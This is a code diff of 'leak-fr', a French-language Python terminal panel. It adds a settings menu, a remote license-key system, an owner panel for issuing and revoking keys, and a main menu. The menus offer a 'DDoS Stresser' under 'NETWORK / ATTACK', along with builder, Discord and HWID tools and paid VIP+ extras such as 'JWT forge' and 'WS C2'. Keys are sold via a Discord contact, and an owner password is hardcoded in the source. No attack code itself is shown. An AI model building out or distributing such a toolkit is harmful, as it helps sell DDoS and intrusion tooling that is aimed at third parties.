+            data = json.load(open(_SETTINGS_FILE, encoding="utf-8"))
+            if isinstance(data, dict):
+                _SETTINGS.update(data)
+        except Exception:
+            pass
+    LOADER_ON = bool(_SETTINGS.get("loader_on", True))
+    return _SETTINGS
+
+
+def _save_settings():
+    os.makedirs(_SETTINGS_DIR, exist_ok=True)
+    try:
+        with open(_SETTINGS_FILE, "w", encoding="utf-8") as f:
+            json.dump(_SETTINGS, f, indent=2)
+        return True
+    except Exception:
+        return False
+
+
+def _get(key, default=None):
+    return _SETTINGS.get(key, _DEFAULT_SETTINGS.get(key, default))
+
+
+def settings_menu():
+    banner_s("PARAMETRES")
+    while True:
+        print(f"  {BLOOD_MID}──[ {BOLD_ANSI}{BLOOD_LIGHT}OPTIONS ACTUELLES{RESET_ANSI}{BLOOD_MID} ]──{RESET_ANSI}\n")
+        opts = [
+            ("1", "Auto-activation",      _get("auto_activate"),  "utilise preset_key au boot si pas de licence"),
+            ("2", "Cle preset",           _get("preset_key") or "(vide)", "cle utilisee pour l'auto-activation"),
+            ("3", "Memoriser la licence", _get("remember_license"), "garde .leakfr_license entre sessions"),
+            ("4", "Vider cache au boot",  _get("clear_cache_on_boot"), "supprime la licence a chaque demarrage"),
+            ("5", "Loader anime",         _get("loader_on"),      "animation de chargement"),
+            ("6", "Badge tier banner",    _get("show_tier_badge"), "affiche OWNER/VIP/... en haut"),
+            ("7", "Verbose serveur",      _get("verbose_server"), "affiche les reponses brutes"),
+        ]
+        for n, label, val, desc in opts:
+            if isinstance(val, bool):
+                v = f"{G}ON{RST}" if val else f"{R}OFF{RST}"
+            elif label == "Cle preset" and val and val != "(vide)":
+                v = f"{G}{str(val)[:24]}...{RST}"
+            else:
+                v = f"{Y}{val}{RST}"
+            print(f"    {BLOOD_PALE}[{n}]{RESET_ANSI} {W}{label:<22}{RESET_ANSI} {v}")
+            print(f"      {DIM}{desc}{RESET_ANSI}")
+        print(f"\n    {BLOOD_DARK}[8]{RESET_ANSI} {W}Reset aux valeurs par defaut{RESET_ANSI}")
+        print(f"    {BLOOD_DARK}[0]{RESET_ANSI} {W}Retour{RESET_ANSI}\n")
+
+        c = input(f"  {R}settings>{RST} ").strip()
+        if c == "0": break
+        elif c == "1":
+            _SETTINGS["auto_activate"] = not _get("auto_activate")
+            _save_settings()
+        elif c == "2":
+            cur = _get("preset_key") or ""
+            print(f"  {DIM}Actuel : {cur or '(vide)'}{RESET_ANSI}")
+            k = ask("Nouvelle cle preset (vide pour effacer):")
+            _SETTINGS["preset_key"] = k
+            _save_settings()
+        elif c == "3":
+            _SETTINGS["remember_license"] = not _get("remember_license")
+            _save_settings()
+        elif c == "4":
+            _SETTINGS["clear_cache_on_boot"] = not _get("clear_cache_on_boot")
+            _save_settings()
+        elif c == "5":
+            _SETTINGS["loader_on"] = not _get("loader_on")
+            global LOADER_ON
+            LOADER_ON = bool(_SETTINGS["loader_on"])
+            _save_settings()
+        elif c == "6":
+            _SETTINGS["show_tier_badge"] = not _get("show_tier_badge")
+            _save_settings()
+        elif c == "7":
+            _SETTINGS["verbose_server"] = not _get("verbose_server")
+            _save_settings()
+        elif c == "8":
+            if ask("Confirmer reset? (y/n):", "n").lower() == "y":
+                _SETTINGS.clear()
+                _SETTINGS.update(_DEFAULT_SETTINGS)
+                LOADER_ON = bool(_DEFAULT_SETTINGS["loader_on"])
+                _save_settings()
+                print(f"{OK} Parametres reinitialises.")
+                time.sleep(0.8)
+        # re-render
+        leakfr_banner()
+        print(f"  {BLOOD_MID}──[ {BOLD_ANSI}{BLOOD_LIGHT}OPTIONS ACTUELLES{RESET_ANSI}{BLOOD_MID} ]──{RESET_ANSI}\n")
+
+# ========================================================================
+# LICENSE / ACTIVATION
+# ========================================================================
+_PRESET_KEY  = ""
 _OWNER_PW    = "moumou-leakfr"
 _OWNER_TRIG  = "1337"
 _LIC_DIR     = "1-Output"
 _LIC_FILE    = os.path.join(_LIC_DIR, ".leakfr_license")
-_LIC_SERVER  = "https://TON-URL.trycloudflare.com"   # <-- A CHANGER
+_LIC_SERVER  = "https://oklahoma-drug-deck-exciting.trycloudflare.com"
 _LIC_GRACE   = 7 * 86400
 _OWNER_TRIES = {"n": 0}
 
@@ -3817,7 +4625,6 @@ def _is_activated():
     if not lic: return False, "aucune licence"
     hwid = _hwid()
     if lic.get("hwid") != hwid: return False, "mauvaise machine"
-
     r = _remote_validate(lic["key"], hwid)
     if r.get("ok"):
         lic["exp"] = r["exp"]; lic["tier"] = r.get("tier", "free"); lic["sig"] = r["sig"]
@@ -3827,7 +4634,6 @@ def _is_activated():
         if lic["exp"] != 0 and lic["exp"] < int(time.time()):
             return False, "cle expiree"
         return True, "ok"
-
     if "offline" in r.get("msg", ""):
         age = int(time.time()) - lic.get("cached_at", 0)
         if age > _LIC_GRACE: return False, "cache expire"
@@ -3862,7 +4668,6 @@ def activation_screen():
           f"{BOLD_ANSI}{BLOOD_BRIGHT}{'A C T I V A T I O N':^60}{RESET_ANSI} "
           f"{BLOOD_MID}║{RESET_ANSI}")
     print(f"  {BLOOD_MID}{bar}{RESET_ANSI}\n")
-
     if _PRESET_KEY and not os.path.isfile(_LIC_FILE):
         print(f"  {DIM}Auto-activation avec cle preset...{RESET_ANSI}")
         _page_loader("Activation licence preset")
@@ -3874,11 +4679,8 @@ def activation_screen():
         print(f"  {DIM}Tiers   : free · vip · vip+ · ami · owner{RESET_ANSI}")
         print(f"  {DIM}Format  : LEAKFR-XXXX-XXXX-XXXX-XXXX{RESET_ANSI}\n")
         key = input(f"  {BLOOD_BRIGHT}cle >{RESET_ANSI} ").strip()
-
     if key == _OWNER_TRIG:
-        owner_menu()
-        return activation_screen()
-
+        owner_menu(); return activation_screen()
     ok, msg = _activate(key)
     if ok:
         _page_loader("Verification de la licence")
@@ -3901,7 +4703,6 @@ def owner_menu():
         print(f"  {R}[X]{RST} Mot de passe incorrect."); time.sleep(1.2); return
     _OWNER_TRIES["n"] = 0
     _page_loader("Authentification owner")
-
     while True:
         menu_box("OWNER PANEL", [
             ("1", "Generer une cle"), ("2", "Lister les cles"),
@@ -3910,7 +4711,6 @@ def owner_menu():
             ("7", "Statut licence locale"), ("8", "Desactiver cette machine"),
             ("0", "Retour")])
         c = input(f"  {R}owner>{RST} ").strip()
-
         if c == "1":
             dur = ask("Duree (1d 7d 30d 90d 1y life):", "30d")
             exp = _dur_to_exp(dur)
@@ -3925,7 +4725,6 @@ def owner_menu():
             else:
                 print(f"  {R}[X]{RST} {r.get('msg')}")
             pause()
-
         elif c == "2":
             r = _remote_admin("/admin/list", method="GET")
             if not isinstance(r, dict) or r.get("ok") is False:
@@ -3937,21 +4736,18 @@ def owner_menu():
                     print(f"  {Y}{k}{RESET_ANSI}  tier={v.get('tier','free')}  "
                           f"exp={_fmt_exp(v.get('exp', 0))}  hwid={bind}")
             pause()
-
         elif c == "3":
             key = ask("Cle a revoquer:")
             r = _remote_admin("/admin/revoke", {"key": key})
             print(f"  {G}[OK]{RST}" if r.get("ok") else f"  {R}[X]{RST} {r.get('msg')}"); pause()
-
         elif c == "4":
             key = ask("Cle:")
-            dur = ask("Nouvelle duree depuis maintenant:", "30d")
+            dur = ask("Nouvelle duree:", "30d")
             exp = _dur_to_exp(dur)
             if exp is None: print(f"  {R}[X]{RST} invalide."); pause(); continue
             r = _remote_admin("/admin/extend", {"key": key, "exp": exp})
             print(f"  {G}[OK]{RST} -> {_fmt_exp(exp)}" if r.get("ok") else f"  {R}[X]{RST} {r.get('msg')}")
             pause()
-
         elif c == "5":
             key = ask("Cle:")
             tier = ask("Nouveau tier (free/vip/vip+/ami/owner):", "vip").lower()
@@ -3960,13 +4756,11 @@ def owner_menu():
             r = _remote_admin("/admin/tier", {"key": key, "tier": tier})
             print(f"  {G}[OK]{RST} -> tier={tier}" if r.get("ok") else f"  {R}[X]{RST} {r.get('msg')}")
             pause()
-
         elif c == "6":
             key = ask("Cle a unbind:")
             r = _remote_admin("/admin/unbind", {"key": key})
             print(f"  {G}[OK]{RST} unbind." if r.get("ok") else f"  {R}[X]{RST} {r.get('msg')}")
             pause()
-
         elif c == "7":
             ok, msg = _is_activated()
             if ok:
@@ -3978,13 +4772,11 @@ def owner_menu():
             else:
                 print(f"  {R}[INACTIVE]{RST} {msg}")
             pause()
-
         elif c == "8":
             if ask("Confirmer? (y/n):", "n").lower() == "y":
                 try: os.remove(_LIC_FILE); print(f"  {G}[OK]{RST} licence locale retiree.")
                 except Exception as e: print(f"  {R}[FAIL]{RST} {e}")
             pause()
-
         elif c == "0": break
 
 
@@ -4022,7 +4814,7 @@ def info_contact_screen():
 
   {Y}VIP 30j{RST}        : {W}panel VIP complet{RST}
   {Y}VIP Life{RST}       : {W}panel VIP + MAJ serveur a vie{RST}
-  {PLUS_COL}VIP+{RST}           : {W}VIP + 5 outils exclusifs (dork forge, friend graph, session link...){RST}
+  {PLUS_COL}VIP+{RST}           : {W}VIP + 19 outils exclusifs (combo validator, WAF, JWT forge, WS C2...){RST}
   {AMI_COL}AMI{RST}            : {W}tout + branding custom + vault perso + relay owner + presets{RST}
   {Y}Owner{RST}          : {W}tout + gestion des cles{RST}
 
@@ -4048,16 +4840,17 @@ MAIN_CATEGORIES = [
     ]),
     ("PANEL & TOOLS", CAT_PANEL, CAT_PANEL_DARK, [
         ("20", "VIP Panel"),
-        ("25", "VIP+ Panel"),
-        ("26", "AMI Panel"),
         ("21", "Roblox Tools"),
         ("22", "Crypto Tools"),
         ("23", "Phone / SMS"),
         ("24", "Utilities"),
+        ("25", "VIP+ Panel"),
+        ("26", "AMI Panel"),
     ]),
     ("NETWORK / ATTACK", CAT_NETWORK, CAT_NETWORK_DARK, [
         ("30", "DDoS Stresser"),
         ("40", "Info & Contact"),
+        ("50", "Parametres"),
     ]),
 ]
 
@@ -4073,7 +4866,11 @@ def _box_group(title, cb, cd, items, col_w=26):
         filln = max(0, col_w - vis - 1)
         lines.append(f"{cd}│{RESET_ANSI} {item}" + (" " * filln) + f"{cd}│{RESET_ANSI}")
     while len(lines) < 10:
-        lines.append(f"{cd}│{RESET_ANSI}" + (" " * col_w) + f"{cd}│{RESET_ANSI}")
+        inner = " " * col_w
+        if 1 < len(lines) < 9:
+            mid = col_w // 2
+            inner = " " * mid + f"{GHOST}·{RESET_ANSI}" + " " * (col_w - mid - 1)
+        lines.append(f"{cd}│{RESET_ANSI}" + inner + f"{cd}│{RESET_ANSI}")
     lines.append(foot)
     return lines
 
@@ -4090,14 +4887,13 @@ def leakfr_main_menu():
     print()
     for i in range(max_h):
         print(" " * left_pad + "  ".join(_pad(b[i], 28) for b in boxes))
-
-    tier_col = { "free": DIM, "vip": BLOOD_BRIGHT, "vip+": PLUS_COL, "ami": AMI_COL, "owner": GOLD }.get(_TIER, DIM)
+    tier_col = {"free": DIM, "vip": BLOOD_BRIGHT, "vip+": PLUS_COL,
+                "ami": AMI_COL, "owner": GOLD}.get(_TIER, DIM)
     hint = f"tier: {_TIER}  ·  0 = exit  ·  1337 = owner"
     pad_hint = max(0, (W_ - len(hint)) // 2)
     print(f"\n{' ' * pad_hint}{BLOOD_MID}»{RESET_ANSI} "
           f"{tier_col}tier: {_TIER}{RESET_ANSI}  "
           f"{GHOST}·  0 = exit  ·  1337 = owner{RESET_ANSI}")
-
     contact = "Discord moumou0718 pour obtenir une key"
     pad_c = max(0, (W_ - len(contact) - 4) // 2)
     print(f"{' ' * pad_c}{BLOOD_DARK}──[ {RESET_ANSI}"
@@ -4106,6 +4902,21 @@ def leakfr_main_menu():
 
 
 def main():
+    _load_settings()
+
+    if _get("clear_cache_on_boot") and os.path.isfile(_LIC_FILE):
+        try: os.remove(_LIC_FILE)
+        except Exception: pass
+
+    if _get("auto_activate") and not os.path.isfile(_LIC_FILE):
+        pk = _get("preset_key")
+        if pk:
+            print(f"  {DIM}Auto-activation avec cle preset...{RESET_ANSI}")
+            _page_loader("Activation preset")
+            ok_a, msg_a = _activate(pk)
+            if not ok_a:
+                print(f"  {Y}[!]{RST} Auto-activation echouee : {msg_a}")
+
     ok, msg = _is_activated()
     if not ok:
         activation_screen()
@@ -4127,31 +4938,53 @@ def main():
         c = input(" " * pp + f"{BLOOD_BRIGHT}leak-fr >{RESET_ANSI} ").strip().lower()
 
         if c == _OWNER_TRIG:
-            owner_menu(); continue
+            owner_menu()
+            continue
+
         if c in ("0", "exit", "quit"):
             clr()
             print(f"\n  {BLOOD_LIGHT}leak-fr{RESET_ANSI} "
                   f"{GHOST}· by 31300-leak-fr · a bientot.{RESET_ANSI}\n")
             sys.exit(0)
-        elif c in ("01", "1"): builder_menu()
-        elif c in ("02", "2"): hwid_menu()
-        elif c in ("03", "3"): discord_menu()
-        elif c in ("04", "4"): vc_menu()
-        elif c == "10": net_menu()
-        elif c == "11": web_menu()
-        elif c == "12": osint_menu()
-        elif c == "20": vip_menu()
-        elif c == "25": vipx_menu()
-        elif c == "26": ami_menu()
-        elif c == "21": roblox_menu()
-        elif c == "22": crypto_menu()
-        elif c == "23": phone_menu()
-        elif c == "24": util_menu()
-        elif c == "30": ddos_menu()
-        elif c in ("40", "99"): info_contact_screen()
+        elif c in ("01", "1"):
+            builder_menu()
+        elif c in ("02", "2"):
+            hwid_menu()
+        elif c in ("03", "3"):
+            discord_menu()
+        elif c in ("04", "4"):
+            vc_menu()
+        elif c == "10":
+            net_menu()
+        elif c == "11":
+            web_menu()
+        elif c == "12":
+            osint_menu()
+        elif c == "20":
+            vip_menu()
+        elif c == "21":
+            roblox_menu()
+        elif c == "22":
+            crypto_menu()
+        elif c == "23":
+            phone_menu()
+        elif c == "24":
+            util_menu()
+        elif c == "25":
+            vipx_menu()
+        elif c == "26":
+            ami_menu()
+        elif c == "30":
+            ddos_menu()
+        elif c in ("40", "99"):
+            info_contact_screen()
+        elif c == "50":
+            settings_menu()
         else:
             print(f"  {BLOOD_MID}[leak-fr]{RESET_ANSI} option inconnue.")
             time.sleep(0.6)
+
+
 
 
 # ========================================================================
